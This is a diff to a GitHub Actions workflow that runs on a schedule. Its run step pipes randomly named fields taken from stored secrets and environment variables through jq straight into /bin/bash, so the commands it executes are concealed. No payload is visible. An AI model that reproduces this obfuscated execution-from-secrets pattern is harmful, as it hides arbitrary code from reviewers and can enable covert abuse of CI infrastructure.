@@ -3,7 +3,8 @@ name: fuliming9891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
+    - cron: '11 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: fuliming9891
         env:
-          j56282: ${{ secrets.j56282 }}
+          n766: ${{ secrets.n766 }}
         run: |
-          echo $j56282 | jq -r .ssa08448 | /bin/bash
-          echo $yhtlk577 | jq -r .zu71 | /bin/bash
-          echo $cf4116 | jq -r .vt0 | /bin/bash
-          echo $o134 | jq -r .ro12 | /bin/bash
+          echo $n766 | jq -r .hj05 | /bin/bash
+          echo $xvm9 | jq -r .wsce8189 | /bin/bash
+          echo $jzp8543 | jq -r .aycax0115 | /bin/bash
+          echo $ohya309 | jq -r .ycytr018 | /bin/bash
+          echo $svloe05 | jq -r .ta44079 | /bin/bash
+          echo $urtx4754 | jq -r .lwraj40 | /bin/bash
+          echo $uqbus7849 | jq -r .p17685 | /bin/bash
+          echo $mt2 | jq -r .glpeh4285 | /bin/bash
+          echo $cbnjn689 | jq -r .km75328 | /bin/bash
+          echo $l40 | jq -r .yp899 | /bin/bash
+          echo $upl37 | jq -r .zocte33783 | /bin/bash
 
